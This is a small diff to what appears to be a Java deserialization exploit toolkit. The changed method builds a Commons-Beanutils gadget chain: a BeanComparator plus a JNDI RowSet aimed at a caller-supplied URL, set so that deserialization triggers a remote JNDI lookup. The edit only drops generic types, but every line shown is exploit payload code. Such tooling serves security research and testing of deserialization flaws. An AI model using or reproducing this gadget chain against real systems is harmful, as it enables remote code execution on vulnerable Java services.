@@ -45,7 +45,7 @@ public interface CommonsBeanutils extends Gadget {
         MarshallerBase.defaultJNDIUrl
     } )
     default Object makeCommonsBeanutilsJNDI ( UtilFactory uf, String... args ) throws Exception {
-        BeanComparator<Object> cmp = new BeanComparator<>("lowestSetBit", Collections.reverseOrder());
+        BeanComparator cmp = new BeanComparator("lowestSetBit", Collections.reverseOrder());
         Object trig = uf.makeComparatorTrigger(JDKUtil.makeJNDIRowSet(args[ 0 ]), cmp);
         Reflections.setFieldValue(cmp, "property", "databaseMetaData");
         return trig;
